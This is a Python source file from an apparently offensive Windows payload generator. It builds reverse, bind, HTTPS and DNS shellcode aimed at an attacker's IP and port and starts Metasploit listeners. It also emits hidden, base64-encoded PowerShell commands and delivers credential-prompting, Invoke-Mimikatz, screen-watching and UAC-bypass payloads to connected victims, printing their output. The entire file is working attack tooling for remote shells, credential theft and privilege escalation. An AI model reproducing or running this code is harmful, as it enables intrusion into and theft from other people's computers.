from main import *
from payloadextras import *
from startmetasploit import *
from generatepayload import *

def reverseIpAndPort(port):
    portnum = raw_input(
        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + port + t.normal))
    if len(portnum) is 0:
        portnum = port
    IP = FUNCTIONS().CheckInternet()
    ipaddr = raw_input(
        '\n[*] Press Enter To Get Local Ip Automatically(%s)\n[*] IP> '%(t.bold_green + IP + t.normal))
    if len(ipaddr) == 0:
        ipaddr = IP
    if not IP:
        print t.bold_red + 'Error Getting Ip Automatically' + t.normal
        ipaddr = raw_input(
            '\n[*] Please Enter Your IP Manually(Automatic Disabled)\n[*] IP> ')
    return (portnum,ipaddr)

def reversePayloadGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')
    try:
        ip1, ip2, ip3, ip4 = ipaddr.split('.')
        iphex = struct.pack('BBBB', int(ip1), int(ip2), int(ip3), int(ip4))
    except Exception as E:
        print E
        print t.bold_red + '[*] Error in IP Syntax'
        sys.exit(1)
    try:
        porthex = struct.pack('>h', int(portnum))
    except:
        print t.bold_red + '[*] Error in Port Syntax'
        sys.exit(1)
    shellcode = payloadchoice % (iphex, porthex)
    print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
    if payloadname == "Windows_Reverse_Shell":
        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'nclistener')
    else:
        ez2read_shellcode, startRevMetasploit = askAndReturnModules(shellcode,'reverse')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startRevMetasploit(portnum)
    return "clear"

def bindPayloadGeneration(payloadchoice,payloadname):
    bindport = raw_input(
            '\n[*] Press Enter For Default Bind Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
    if len(bindport) is 0:
        bindport = 4444
    try:
        bindporthex = struct.pack('>h', int(bindport))
    except:
        print t.bold_red + '[!] Error in Port Syntax' + t.normal
        sys.exit(1)
    shellcode = payloadchoice % (bindporthex)
    bindip = raw_input(
        '\n[*] Target Bind IP Address ' + t.bold_red + '(REQUIRED FOR BIND PAYLOADS)' + t.normal +' \n[*] IP> ')
    print t.bold_green + '[*] BIND IP SET AS %s\n[*] PORT SET AS %s\n' % (bindip,bindport) + t.normal
    ez2read_shellcode, startBindMetasploit = askAndReturnModules(shellcode,'bind')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startBindMetasploit(bindport,bindip)
    return "clear"

def httpsPayloadGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('443')
    try:
        porthex = struct.pack('<h', int(portnum))
    except:
        print t.bold_red + '[!] Error in Port Syntax' + t.normal
        sys.exit(1)

    iphex = ipaddr
    shellcode = payloadchoice % (porthex, iphex)
    print t.bold_green + '[*] IP SET AS %s\n[*] PORT SET AS %s\n' % (ipaddr, portnum) + t.normal
    ez2read_shellcode, startHttpsMetasploit = askAndReturnModules(shellcode,'https')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startHttpsMetasploit(portnum)
    return "clear"

def dnsPayloadGeneration(payloadchoice,payloadname):
    portnum = raw_input(
        '\n[*] Press Enter For Default Port(%s)\n[*] Port> '%(t.bold_green + '4444' + t.normal))
    if len(portnum) is 0:
        portnum = 4444
    try:
        porthex = struct.pack('>h', int(portnum))
    except:
        print t.bold_red + '[*] Error in Port Syntax'
        sys.exit(1)
    while True:
        DNSaddr = raw_input(
            '\n[*] Please Enter DNS Hostname\n[*] DNS> ')
        if DNSaddr:
            break
    shellcode = payloadchoice % (DNSaddr,porthex)
    print t.bold_green + '[*] DNS HOSTNAME SET AS %s\n[*] PORT SET AS %s\n' % (DNSaddr, portnum) + t.normal
    ez2read_shellcode, startDnsMetasploit = askAndReturnModules(shellcode,'dns')
    GeneratePayload(ez2read_shellcode,payloadname,shellcode)
    startDnsMetasploit(portnum,DNSaddr)
    return "clear"

def reversePowerShellWatchScreenGeneration(payloadchoice,payloadname):
    portnum,ipaddr = reverseIpAndPort('4444')
    shellcode = payloadchoice % (ipaddr,portnum)
    powershellExec = 'powershell.exe -WindowStyle Hidden -enc %s'%(base64.b64encode(shellcode.encode('utf_16_le')))
    print t.bold_green + '\n[*] Powershell Has Been Generated' + t.normal
    checkClientUpload(payloadname,powershellExec,isExe=False)
    from listener import Server
    listenerserver = Server('0.0.0.0', int(portnum), bindsocket=True)
    relayserver = Server('127.0.0.1', 8081, relay=True)
    os.system('firefox 127.0.0.1:8081')
    print 'waiting for connection...\nCTRL + C when done\n'
    try:
        while not listenerserver.handlers:
            time.sleep(0.5)
        while listenerserver:
            if listenerserver.handlers[1].in_buffer:
                relayserver.handlers[1].out_buffer.append(listenerserver.handlers[1].in_buffer.pop())
    except KeyboardInterrupt:
        if listenerserver.handlers:
            listenerserver.handlers[1].handle_close()
    return "pass"

def reversePowerShellAskCredsGeneration(payloadchoice,payloadname):
    clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
    from stager import returnServerList
    try:
        for server in returnServerList():
            while True:
                if server.handlers[clientnumber].in_buffer:
                    print server.handlers[clientnumber].in_buffer.pop()
                    break
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    return "pass"


#update this
def reversePowerShellInvokeMimikatzGeneration(payloadchoice,payloadname):
    clientnumber = int(clientUpload(payloadname,payloadchoice,isExe=False,json='{"type":"script", "data":"%s", "sendoutput":"true", "multiple":"false"}'))
    from stager import returnServerList
    try:
        for server in returnServerList():
            while True:
                if server.handlers[clientnumber].in_buffer:
                    print server.handlers[clientnumber].in_buffer.pop()
                    break
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    return "pass"

def UACBypassGeneration(payloadchoice,payloadname):
    win7orwin10 = raw_input(t.bold_red + '[*] Windows 7 or 10?' + t.bold_red + ' 7/[10]:' + t.normal)
    if not win7orwin10:
        win7orwin10 = "10"
    if win7orwin10 == "7":
        json = '{"type":"uacbypass", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
    else:
        json = '{"type":"uacbypass", "data":"%s", "sendoutput":"true"}'% (base64.b64encode(payloadchoice.encode('utf_16_le')))
    clientnumber = int(checkClientUpload(payloadname,json,isExe=False))
    from stager import returnServerList
    try:
        for server in returnServerList():
            while True:
                if server.handlers[clientnumber].in_buffer:
                    print server.handlers[clientnumber].in_buffer.pop()
                    break
                else:
                    time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    return "pass"
